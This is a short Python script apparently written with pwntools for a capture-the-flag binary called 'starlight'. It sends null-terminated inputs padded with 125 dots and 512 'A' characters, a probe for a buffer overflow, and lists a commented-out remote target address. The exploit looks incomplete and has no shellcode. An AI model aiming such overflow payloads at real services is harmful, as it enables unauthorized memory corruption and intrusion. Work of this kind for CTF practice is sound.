from pwn import *

p = process("./starlight")
#p = remote("203.34.119.237", 11337)
payload = "id"
payload += "\x00" + '.'* 125
p.sendline(payload)
#p.interactive()
payload = "2"
payload += "\x00" + 'A' * 512
p.sendline(payload)
#p.interactive()
#payload = ""
#payload += '\x00' * 132
#p.sendline(payload)
p.interactive()
